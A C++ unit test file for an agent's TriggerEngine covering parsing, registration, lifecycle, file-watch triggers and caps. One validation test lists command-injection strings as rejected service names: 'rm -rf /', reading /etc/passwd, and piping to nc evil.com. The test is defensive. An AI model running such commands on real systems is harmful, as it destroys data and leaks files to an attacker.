/**
 * test_trigger_engine.cpp -- Unit tests for TriggerEngine
 *
 * Covers: registration, unregistration, startup triggers, interval triggers,
 * file change triggers, service name validation, type parsing, lifecycle,
 * minimum interval clamping.
 */

#include <yuzu/agent/trigger_engine.hpp>

#include "test_helpers.hpp"

#include <catch2/catch_test_macros.hpp>

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <filesystem>
#include <fstream>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace fs = std::filesystem;
using namespace yuzu::agent;

namespace {

/// Helper to collect dispatch calls.
struct DispatchRecorder {
    std::mutex mu;
    std::condition_variable cv;
    std::vector<std::tuple<std::string, std::string, std::map<std::string, std::string>>> calls;

    TriggerEngine::DispatchFn callback() {
        return [this](const std::string& plugin, const std::string& action,
                      const std::map<std::string, std::string>& params) {
            std::lock_guard lock(mu);
            calls.emplace_back(plugin, action, params);
            cv.notify_all();
        };
    }

    size_t count() {
        std::lock_guard lock(mu);
        return calls.size();
    }

    bool wait_for(size_t n, std::chrono::milliseconds timeout) {
        std::unique_lock lock(mu);
        return cv.wait_for(lock, timeout, [&]() { return calls.size() >= n; });
    }
};

} // namespace

// ═══════════════════════════════════════════════════════════════════════════════
// TriggerType parsing (free functions in the header)
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("trigger_type_to_string covers all types", "[trigger_engine][parsing]") {
    CHECK(std::string(trigger_type_to_string(TriggerType::Interval)) == "interval");
    CHECK(std::string(trigger_type_to_string(TriggerType::FileChange)) == "filesystem");
    CHECK(std::string(trigger_type_to_string(TriggerType::ServiceStatus)) == "service");
    CHECK(std::string(trigger_type_to_string(TriggerType::AgentStartup)) == "agent-startup");
    CHECK(std::string(trigger_type_to_string(TriggerType::RegistryChange)) == "registry");
}

TEST_CASE("trigger_type_from_string canonical names", "[trigger_engine][parsing]") {
    CHECK(trigger_type_from_string("interval") == TriggerType::Interval);
    CHECK(trigger_type_from_string("filesystem") == TriggerType::FileChange);
    CHECK(trigger_type_from_string("service") == TriggerType::ServiceStatus);
    CHECK(trigger_type_from_string("agent-startup") == TriggerType::AgentStartup);
    CHECK(trigger_type_from_string("registry") == TriggerType::RegistryChange);
}

TEST_CASE("trigger_type_from_string alternate names", "[trigger_engine][parsing]") {
    CHECK(trigger_type_from_string("file_change") == TriggerType::FileChange);
    CHECK(trigger_type_from_string("service_status") == TriggerType::ServiceStatus);
    CHECK(trigger_type_from_string("agent_startup") == TriggerType::AgentStartup);
    CHECK(trigger_type_from_string("startup") == TriggerType::AgentStartup);
    CHECK(trigger_type_from_string("registry_change") == TriggerType::RegistryChange);
}

TEST_CASE("trigger_type_from_string unknown defaults to Interval", "[trigger_engine][parsing]") {
    CHECK(trigger_type_from_string("bogus") == TriggerType::Interval);
    CHECK(trigger_type_from_string("") == TriggerType::Interval);
    CHECK(trigger_type_from_string("INTERVAL") == TriggerType::Interval); // case-sensitive
}

// ═══════════════════════════════════════════════════════════════════════════════
// parse_trigger_config — the C-ABI trigger-registration parse point
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("parse_trigger_config: TAR interval config round-trips", "[trigger_engine][parsing]") {
    // This is exactly what the TAR plugin's init() passes across the C ABI.
    auto cfg = parse_trigger_config(
        "tar.fast", "interval",
        R"({"interval_seconds":60,"plugin":"tar","action":"collect_fast","parameters":{}})");
    REQUIRE(cfg.has_value());
    CHECK(cfg->id == "tar.fast");
    CHECK(cfg->type == TriggerType::Interval);
    CHECK(cfg->plugin == "tar");
    CHECK(cfg->action == "collect_fast");
    CHECK(cfg->interval_seconds == 60);
    CHECK(cfg->parameters.empty());
}

TEST_CASE("parse_trigger_config: malformed JSON returns nullopt", "[trigger_engine][parsing]") {
    CHECK_FALSE(parse_trigger_config("x", "interval", "{not json").has_value());
    CHECK_FALSE(parse_trigger_config("x", "interval", "").has_value());
}

TEST_CASE("parse_trigger_config: missing plugin or action returns nullopt",
          "[trigger_engine][parsing]") {
    // A trigger with no plugin/action can never dispatch — reject it rather
    // than register a dead trigger.
    CHECK_FALSE(
        parse_trigger_config("x", "interval", R"({"interval_seconds":60,"action":"collect_fast"})")
            .has_value());
    CHECK_FALSE(parse_trigger_config("x", "interval", R"({"interval_seconds":60,"plugin":"tar"})")
                    .has_value());
}

TEST_CASE("parse_trigger_config: parameters object is forwarded", "[trigger_engine][parsing]") {
    auto cfg = parse_trigger_config(
        "p", "interval",
        R"({"interval_seconds":30,"plugin":"tar","action":"rollup","parameters":{"mode":"full","keep":"7"}})");
    REQUIRE(cfg.has_value());
    REQUIRE(cfg->parameters.size() == 2);
    CHECK(cfg->parameters.at("mode") == "full");
    CHECK(cfg->parameters.at("keep") == "7");
}

TEST_CASE("parse_trigger_config: filesystem trigger captures watch_path",
          "[trigger_engine][parsing]") {
    auto cfg = parse_trigger_config(
        "watch-hosts", "filesystem",
        R"({"plugin":"event_logs","action":"scan","watch_path":"/etc/hosts"})");
    REQUIRE(cfg.has_value());
    CHECK(cfg->type == TriggerType::FileChange);
    CHECK(cfg->watch_path == "/etc/hosts");
    CHECK(cfg->plugin == "event_logs");
}

// ═══════════════════════════════════════════════════════════════════════════════
// Service name validation (mirror function)
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("is_valid_service_name: valid names", "[trigger_engine][validation]") {
    CHECK(TriggerEngine::is_valid_service_name("sshd"));
    CHECK(TriggerEngine::is_valid_service_name("my-service.timer"));
    CHECK(TriggerEngine::is_valid_service_name("nginx"));
    CHECK(TriggerEngine::is_valid_service_name("com.apple.launchd"));
    CHECK(TriggerEngine::is_valid_service_name("docker_engine"));
    CHECK(TriggerEngine::is_valid_service_name("user@1000.service"));
    CHECK(TriggerEngine::is_valid_service_name("W32Time"));
}

TEST_CASE("is_valid_service_name: injection attempts rejected", "[trigger_engine][validation]") {
    CHECK_FALSE(TriggerEngine::is_valid_service_name("sshd; rm -rf /"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("sshd && cat /etc/passwd"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("sshd | nc evil.com 1234"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("$(whoami)"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("`uname -a`"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("sshd\nnewline"));
    CHECK_FALSE(TriggerEngine::is_valid_service_name("svc name with spaces"));
}

TEST_CASE("is_valid_service_name: empty string rejected", "[trigger_engine][validation]") {
    CHECK_FALSE(TriggerEngine::is_valid_service_name(""));
}

TEST_CASE("is_valid_service_name: over 256 chars rejected", "[trigger_engine][validation]") {
    std::string long_name(257, 'a');
    CHECK_FALSE(TriggerEngine::is_valid_service_name(long_name));
    // Exactly 256 should be OK
    std::string exact(256, 'a');
    CHECK(TriggerEngine::is_valid_service_name(exact));
}

// ═══════════════════════════════════════════════════════════════════════════════
// Registration
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: register adds trigger", "[trigger_engine][registration]") {
    TriggerEngine engine;
    CHECK(engine.trigger_count() == 0);

    TriggerConfig cfg;
    cfg.id = "trig-1";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "hw_info";
    cfg.action = "collect";
    cfg.interval_seconds = 60;

    engine.register_trigger(cfg);
    CHECK(engine.trigger_count() == 1);
}

TEST_CASE("TriggerEngine: register multiple triggers", "[trigger_engine][registration]") {
    TriggerEngine engine;

    for (int i = 0; i < 5; ++i) {
        TriggerConfig cfg;
        cfg.id = "trig-" + std::to_string(i);
        cfg.type = TriggerType::Interval;
        cfg.plugin = "p" + std::to_string(i);
        cfg.action = "act";
        cfg.interval_seconds = 60;
        engine.register_trigger(cfg);
    }

    CHECK(engine.trigger_count() == 5);
}

TEST_CASE("TriggerEngine: register with same ID replaces", "[trigger_engine][registration]") {
    TriggerEngine engine;

    TriggerConfig cfg1;
    cfg1.id = "trig-1";
    cfg1.type = TriggerType::Interval;
    cfg1.plugin = "old-plugin";
    cfg1.action = "old-action";
    cfg1.interval_seconds = 60;
    engine.register_trigger(cfg1);

    TriggerConfig cfg2;
    cfg2.id = "trig-1"; // same ID
    cfg2.type = TriggerType::AgentStartup;
    cfg2.plugin = "new-plugin";
    cfg2.action = "new-action";
    engine.register_trigger(cfg2);

    // Count should still be 1 (replaced, not added)
    CHECK(engine.trigger_count() == 1);
}

TEST_CASE("TriggerEngine: unregister removes trigger", "[trigger_engine][registration]") {
    TriggerEngine engine;

    TriggerConfig cfg;
    cfg.id = "trig-1";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.interval_seconds = 60;
    engine.register_trigger(cfg);
    REQUIRE(engine.trigger_count() == 1);

    engine.unregister_trigger("trig-1");
    CHECK(engine.trigger_count() == 0);
}

TEST_CASE("TriggerEngine: unregister non-existent is safe", "[trigger_engine][registration]") {
    TriggerEngine engine;
    // Should not crash or throw
    engine.unregister_trigger("does-not-exist");
    CHECK(engine.trigger_count() == 0);
}

TEST_CASE("TriggerEngine: unregister specific trigger leaves others",
          "[trigger_engine][registration]") {
    TriggerEngine engine;

    TriggerConfig a;
    a.id = "a";
    a.type = TriggerType::Interval;
    a.plugin = "pa";
    a.action = "act";
    a.interval_seconds = 60;

    TriggerConfig b;
    b.id = "b";
    b.type = TriggerType::Interval;
    b.plugin = "pb";
    b.action = "act";
    b.interval_seconds = 60;

    engine.register_trigger(a);
    engine.register_trigger(b);
    REQUIRE(engine.trigger_count() == 2);

    engine.unregister_trigger("a");
    CHECK(engine.trigger_count() == 1);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Minimum interval clamping
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: interval < 30 clamped to 30", "[trigger_engine][config]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "fast-trigger";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.interval_seconds = 5; // below minimum

    engine.register_trigger(cfg);

    // Start and let it run for 3 seconds — the trigger should NOT fire because
    // the interval was clamped to 30s and first observation doesn't fire.
    engine.start();
    std::this_thread::sleep_for(std::chrono::seconds{3});
    engine.stop();

    CHECK(recorder.count() == 0);
}

TEST_CASE("TriggerEngine: interval of 0 is clamped to 30", "[trigger_engine][config]") {
    TriggerEngine engine;

    TriggerConfig cfg;
    cfg.id = "zero-interval";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.interval_seconds = 0;

    // Should not crash; interval is clamped to 30
    engine.register_trigger(cfg);
    CHECK(engine.trigger_count() == 1);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Startup triggers
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: startup trigger fires on start()", "[trigger_engine][startup]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "boot-check";
    cfg.type = TriggerType::AgentStartup;
    cfg.plugin = "hw_info";
    cfg.action = "collect_all";
    cfg.parameters = {{"format", "json"}};

    engine.register_trigger(cfg);
    engine.start();

    // Startup triggers fire synchronously during start(), so the callback
    // should already have been invoked by the time start() returns.
    REQUIRE(recorder.count() == 1);

    auto& [plugin, action, params] = recorder.calls[0];
    CHECK(plugin == "hw_info");
    CHECK(action == "collect_all");
    CHECK(params.at("format") == "json");

    engine.stop();
}

TEST_CASE("TriggerEngine: multiple startup triggers all fire", "[trigger_engine][startup]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    for (int i = 0; i < 3; ++i) {
        TriggerConfig cfg;
        cfg.id = "startup-" + std::to_string(i);
        cfg.type = TriggerType::AgentStartup;
        cfg.plugin = "plugin-" + std::to_string(i);
        cfg.action = "init";
        engine.register_trigger(cfg);
    }

    engine.start();
    CHECK(recorder.count() == 3);
    engine.stop();
}

TEST_CASE("TriggerEngine: non-startup triggers do not fire on start()",
          "[trigger_engine][startup]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig interval_cfg;
    interval_cfg.id = "interval-1";
    interval_cfg.type = TriggerType::Interval;
    interval_cfg.plugin = "p1";
    interval_cfg.action = "act";
    interval_cfg.interval_seconds = 60;
    engine.register_trigger(interval_cfg);

    TriggerConfig startup_cfg;
    startup_cfg.id = "startup-1";
    startup_cfg.type = TriggerType::AgentStartup;
    startup_cfg.plugin = "p2";
    startup_cfg.action = "boot";
    engine.register_trigger(startup_cfg);

    engine.start();

    // Only the startup trigger should fire immediately
    CHECK(recorder.count() == 1);
    [[maybe_unused]] auto& [plugin, action, params] = recorder.calls[0];
    CHECK(plugin == "p2");

    engine.stop();
}

// ═══════════════════════════════════════════════════════════════════════════════
// Interval triggers (with real timers)
// ═══════════════════════════════════════════════════════════════════════════════

// NOTE: We cannot easily test interval triggers firing because the minimum
// interval is clamped to 30 seconds, and the interval loop sleeps in 1-second
// increments with a first-observation skip. A real fire would take 31+ seconds.
// Instead, we test that the interval loop runs without crashing and that the
// engine shuts down cleanly.

TEST_CASE("TriggerEngine: interval trigger registered, start/stop no crash",
          "[trigger_engine][interval]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "heartbeat";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "health";
    cfg.action = "ping";
    cfg.interval_seconds = 30;
    engine.register_trigger(cfg);

    engine.start();
    REQUIRE(engine.is_running());

    // Let the interval loop iterate a couple times
    std::this_thread::sleep_for(std::chrono::seconds{3});

    engine.stop();
    CHECK_FALSE(engine.is_running());
    // No fires expected within 3 seconds (30s interval, first observation skip)
    CHECK(recorder.count() == 0);
}

// ═══════════════════════════════════════════════════════════════════════════════
// File change triggers
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: file change trigger fires on modification",
          "[trigger_engine][filechange]") {
    // Create a temp file to watch. Gate 7 qe-S1 — use a per-invocation
    // unique path rather than a fixed shared directory: parallel Catch2
    // workers (or Defender-induced I/O serialisation on Windows, flake
    // #473) writing to one shared dir cross-pollute mtimes and produce
    // intermittent false fires / false negatives.
    auto tmp_dir = yuzu::test::unique_temp_path("yuzu_trigger_test");
    fs::create_directories(tmp_dir);
    auto watch_file = tmp_dir / "watched.txt";
    {
        std::ofstream ofs(watch_file);
        ofs << "initial content";
    }

    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "file-watch";
    cfg.type = TriggerType::FileChange;
    cfg.plugin = "config_watcher";
    cfg.action = "reload";
    cfg.watch_path = watch_file.string();
    engine.register_trigger(cfg);

    engine.start();

    // The file_watch_loop polls every 5 seconds (sleeping in 1-second increments).
    // First observation records baseline mtime without firing. We need to:
    //   1. Wait for the first poll to establish baseline (~6s to be safe)
    //   2. Modify the file
    //   3. Wait for the second poll to detect the change (~7s more)
    // Total: ~13 seconds. Use generous timeouts to handle CI/slow machines.
    std::this_thread::sleep_for(std::chrono::seconds{8});

    // Modify the file — write different content and explicitly set mtime to
    // a future time to guarantee the change is detectable on all platforms.
    {
        std::ofstream ofs(watch_file, std::ios::trunc);
        ofs << "modified content";
        ofs.flush();
    }
    // On Windows, NTFS timestamp resolution is 100ns but filesystem caching
    // can delay mtime updates. Explicitly bump last_write_time to ensure
    // the file watch loop sees a different timestamp.
    {
        std::error_code ec;
        auto current = fs::last_write_time(watch_file, ec);
        if (!ec) {
            fs::last_write_time(watch_file, current + std::chrono::seconds{10}, ec);
        }
    }

    // Wait for the next poll cycle to detect the change
    bool fired = recorder.wait_for(1, std::chrono::seconds{12});

    engine.stop();

    CHECK(fired);
    if (recorder.count() >= 1) {
        [[maybe_unused]] auto& [plugin, action, params] = recorder.calls[0];
        CHECK(plugin == "config_watcher");
        CHECK(action == "reload");
    }

    // Clean up
    std::error_code ec;
    fs::remove_all(tmp_dir, ec);
}

TEST_CASE("TriggerEngine: file change trigger with empty watch_path is skipped",
          "[trigger_engine][filechange]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "empty-path";
    cfg.type = TriggerType::FileChange;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.watch_path = ""; // empty
    engine.register_trigger(cfg);

    engine.start();
    std::this_thread::sleep_for(std::chrono::seconds{2});
    engine.stop();

    CHECK(recorder.count() == 0);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Lifecycle
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: start and stop clean shutdown", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;

    CHECK_FALSE(engine.is_running());
    engine.start();
    CHECK(engine.is_running());
    engine.stop();
    CHECK_FALSE(engine.is_running());
}

TEST_CASE("TriggerEngine: start without any triggers", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;
    engine.set_dispatch(
        [](const std::string&, const std::string&, const std::map<std::string, std::string>&) {});

    CHECK(engine.trigger_count() == 0);
    engine.start();
    CHECK(engine.is_running());
    std::this_thread::sleep_for(std::chrono::seconds{2});
    engine.stop();
    CHECK_FALSE(engine.is_running());
}

TEST_CASE("TriggerEngine: double start is safe", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;

    engine.start();
    REQUIRE(engine.is_running());

    // Second start should be a no-op (returns immediately)
    engine.start();
    CHECK(engine.is_running());

    engine.stop();
}

TEST_CASE("TriggerEngine: double stop is safe", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;
    engine.start();
    engine.stop();
    // Second stop should be a no-op
    engine.stop();
    CHECK_FALSE(engine.is_running());
}

TEST_CASE("TriggerEngine: stop without start is safe", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;
    engine.stop(); // never started
    CHECK_FALSE(engine.is_running());
}

TEST_CASE("TriggerEngine: destructor stops engine", "[trigger_engine][lifecycle]") {
    // Engine is started but goes out of scope without explicit stop()
    {
        TriggerEngine engine;
        DispatchRecorder recorder;
        engine.set_dispatch(recorder.callback());

        TriggerConfig cfg;
        cfg.id = "will-die";
        cfg.type = TriggerType::Interval;
        cfg.plugin = "p1";
        cfg.action = "act";
        cfg.interval_seconds = 60;
        engine.register_trigger(cfg);

        engine.start();
        REQUIRE(engine.is_running());
        // Destructor should call stop() and join all worker threads
    }
    // If we get here without hanging, the test passes
    CHECK(true);
}

TEST_CASE("TriggerEngine: register trigger after start", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    engine.start();

    TriggerConfig cfg;
    cfg.id = "late-registration";
    cfg.type = TriggerType::AgentStartup; // Won't fire because start() already ran
    cfg.plugin = "late";
    cfg.action = "init";
    engine.register_trigger(cfg);

    CHECK(engine.trigger_count() == 1);

    // Startup triggers only fire during start(), not when registered later
    CHECK(recorder.count() == 0);

    engine.stop();
}

TEST_CASE("TriggerEngine: unregister trigger while running", "[trigger_engine][lifecycle]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "to-remove";
    cfg.type = TriggerType::Interval;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.interval_seconds = 60;
    engine.register_trigger(cfg);

    engine.start();
    REQUIRE(engine.trigger_count() == 1);

    engine.unregister_trigger("to-remove");
    CHECK(engine.trigger_count() == 0);

    engine.stop();
}

// ═══════════════════════════════════════════════════════════════════════════════
// Dispatch without callback
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: startup trigger fires without dispatch set (no crash)",
          "[trigger_engine][dispatch]") {
    TriggerEngine engine;
    // Do NOT call set_dispatch

    TriggerConfig cfg;
    cfg.id = "no-callback";
    cfg.type = TriggerType::AgentStartup;
    cfg.plugin = "p1";
    cfg.action = "act";
    engine.register_trigger(cfg);

    // Should not crash — fire_trigger logs a warning when dispatch_ is empty
    engine.start();
    engine.stop();
    CHECK(true);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Debounce
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: debounce suppresses rapid startup triggers",
          "[trigger_engine][debounce]") {
    // Register two startup triggers with the same debounce window
    // and same ID should only fire once
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "debounced";
    cfg.type = TriggerType::AgentStartup;
    cfg.plugin = "p1";
    cfg.action = "act";
    cfg.debounce_seconds = 60; // large debounce
    engine.register_trigger(cfg);

    // Start fires the trigger once
    engine.start();
    CHECK(recorder.count() == 1);
    engine.stop();
}

// ═══════════════════════════════════════════════════════════════════════════════
// Parameters passed through dispatch
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: parameters are forwarded to dispatch", "[trigger_engine][dispatch]") {
    TriggerEngine engine;
    DispatchRecorder recorder;
    engine.set_dispatch(recorder.callback());

    TriggerConfig cfg;
    cfg.id = "param-test";
    cfg.type = TriggerType::AgentStartup;
    cfg.plugin = "inventory";
    cfg.action = "scan";
    cfg.parameters = {
        {"scope", "full"},
        {"format", "json"},
        {"timeout", "30"},
    };
    engine.register_trigger(cfg);

    engine.start();
    REQUIRE(recorder.count() == 1);

    [[maybe_unused]] auto& [plugin, action, params] = recorder.calls[0];
    CHECK(params.size() == 3);
    CHECK(params.at("scope") == "full");
    CHECK(params.at("format") == "json");
    CHECK(params.at("timeout") == "30");

    engine.stop();
}

// ═══════════════════════════════════════════════════════════════════════════════
// Exception safety in dispatch callback
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: throwing dispatch callback does not crash engine",
          "[trigger_engine][dispatch]") {
    TriggerEngine engine;
    engine.set_dispatch(
        [](const std::string&, const std::string&, const std::map<std::string, std::string>&) {
            throw std::runtime_error("callback exploded");
        });

    TriggerConfig cfg;
    cfg.id = "will-throw";
    cfg.type = TriggerType::AgentStartup;
    cfg.plugin = "p1";
    cfg.action = "act";
    engine.register_trigger(cfg);

    // Should not crash — fire_trigger catches exceptions
    engine.start();
    engine.stop();
    CHECK(true);
}

// ═══════════════════════════════════════════════════════════════════════════════
// TriggerConfig defaults
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerConfig: default values", "[trigger_engine][config]") {
    TriggerConfig cfg;
    CHECK(cfg.id.empty());
    CHECK(cfg.interval_seconds == 0);
    CHECK(cfg.watch_path.empty());
    CHECK(cfg.service_name.empty());
    CHECK(cfg.expected_status.empty());
    CHECK(cfg.registry_hive.empty());
    CHECK(cfg.registry_key.empty());
    CHECK(cfg.debounce_seconds == 0);
    CHECK(cfg.parameters.empty());
}

// ═══════════════════════════════════════════════════════════════════════════════
// Trigger cap enforcement (M14 — configurable max_triggers)
// ═══════════════════════════════════════════════════════════════════════════════

TEST_CASE("TriggerEngine: kDefaultMaxTriggers constant", "[trigger_engine][cap]") {
    CHECK(TriggerEngine::kDefaultMaxTriggers == 2000);
}

TEST_CASE("TriggerEngine: registration rejected at max_triggers cap", "[trigger_engine][cap]") {
    TriggerEngine engine;
    engine.set_max_triggers(5);

    for (int i = 0; i < 5; ++i) {
        TriggerConfig cfg;
        cfg.id = "t-" + std::to_string(i);
        cfg.type = TriggerType::Interval;
        cfg.plugin = "p";
        cfg.action = "a";
        cfg.interval_seconds = 60;
        engine.register_trigger(cfg);
    }
    REQUIRE(engine.trigger_count() == 5);

    // 6th trigger should be rejected
    TriggerConfig overflow;
    overflow.id = "t-overflow";
    overflow.type = TriggerType::Interval;
    overflow.plugin = "p";
    overflow.action = "a";
    overflow.interval_seconds = 60;
    engine.register_trigger(overflow);

    CHECK(engine.trigger_count() == 5); // still 5
}

TEST_CASE("TriggerEngine: replacement at cap still works", "[trigger_engine][cap]") {
    TriggerEngine engine;
    engine.set_max_triggers(3);

    for (int i = 0; i < 3; ++i) {
        TriggerConfig cfg;
        cfg.id = "t-" + std::to_string(i);
        cfg.type = TriggerType::Interval;
        cfg.plugin = "old";
        cfg.action = "a";
        cfg.interval_seconds = 60;
        engine.register_trigger(cfg);
    }
    REQUIRE(engine.trigger_count() == 3);

    // Replace existing trigger at the cap — should succeed
    TriggerConfig replacement;
    replacement.id = "t-1"; // existing ID
    replacement.type = TriggerType::AgentStartup;
    replacement.plugin = "new";
    replacement.action = "b";
    engine.register_trigger(replacement);

    CHECK(engine.trigger_count() == 3); // still 3, replaced not added
}

TEST_CASE("TriggerEngine: set_max_triggers changes effective cap", "[trigger_engine][cap]") {
    TriggerEngine engine;
    engine.set_max_triggers(2);

    TriggerConfig c1;
    c1.id = "a";
    c1.type = TriggerType::Interval;
    c1.plugin = "p";
    c1.action = "act";
    c1.interval_seconds = 60;

    TriggerConfig c2;
    c2.id = "b";
    c2.type = TriggerType::Interval;
    c2.plugin = "p";
    c2.action = "act";
    c2.interval_seconds = 60;

    TriggerConfig c3;
    c3.id = "c";
    c3.type = TriggerType::Interval;
    c3.plugin = "p";
    c3.action = "act";
    c3.interval_seconds = 60;

    engine.register_trigger(c1);
    engine.register_trigger(c2);
    engine.register_trigger(c3); // rejected: cap is 2
    CHECK(engine.trigger_count() == 2);

    // Raise the cap
    engine.set_max_triggers(10);
    engine.register_trigger(c3); // now succeeds
    CHECK(engine.trigger_count() == 3);
}

TEST_CASE("TriggerEngine: unregister frees slot under cap", "[trigger_engine][cap]") {
    TriggerEngine engine;
    engine.set_max_triggers(2);

    TriggerConfig c1;
    c1.id = "a";
    c1.type = TriggerType::Interval;
    c1.plugin = "p";
    c1.action = "act";
    c1.interval_seconds = 60;

    TriggerConfig c2;
    c2.id = "b";
    c2.type = TriggerType::Interval;
    c2.plugin = "p";
    c2.action = "act";
    c2.interval_seconds = 60;

    engine.register_trigger(c1);
    engine.register_trigger(c2);
    REQUIRE(engine.trigger_count() == 2);

    // Remove one — new registration should succeed
    engine.unregister_trigger("a");
    CHECK(engine.trigger_count() == 1);

    TriggerConfig c3;
    c3.id = "c";
    c3.type = TriggerType::Interval;
    c3.plugin = "p";
    c3.action = "act";
    c3.interval_seconds = 60;
    engine.register_trigger(c3);
    CHECK(engine.trigger_count() == 2);
}

TEST_CASE("stop() wakes parked workers promptly — condvar, not sleep-poll", "[trigger][shutdown]") {
    // Pins the 482be2b4 contract: workers wait on a condition variable and wake on
    // stop() immediately, instead of sleeping out a poll interval (the registry
    // watcher slept a FULL 5s per iteration on Linux/macOS, and stop() joins workers
    // SERIALLY — so pre-change teardown of an idle engine cost multiple seconds).
    //
    // Bound rationale (the retracted-hang lesson: a timeout must justify itself
    // against a measured baseline): post-change stop() of an idle engine is
    // millisecond-scale; the PRE-change worst case is >= one full 5s sleep. 3s sits
    // far above healthy (~1000x) and decisively below the old floor, so a regression
    // back to sleep-polling goes red even on a loaded CI box.
    DispatchRecorder recorder;
    TriggerEngine engine;
    engine.set_dispatch(recorder.callback());
    // One long-interval trigger so at least one worker genuinely parks waiting.
    TriggerConfig cfg;
    cfg.id = "condvar-wake-test";
    cfg.plugin = "test_plugin";
    cfg.action = "noop";
    cfg.type = TriggerType::Interval;
    cfg.interval_seconds = 3600;
    engine.register_trigger(cfg);
    engine.start();
    // Let the workers reach their waits (generous; no correctness dependence).
    std::this_thread::sleep_for(std::chrono::milliseconds{200});

    const auto t0 = std::chrono::steady_clock::now();
    engine.stop();
    const auto elapsed = std::chrono::steady_clock::now() - t0;
    CHECK(elapsed < std::chrono::seconds{3});

    // And stop() is idempotent after the condvar rework.
    engine.stop();
    SUCCEED("stop() returned promptly and is idempotent");
}
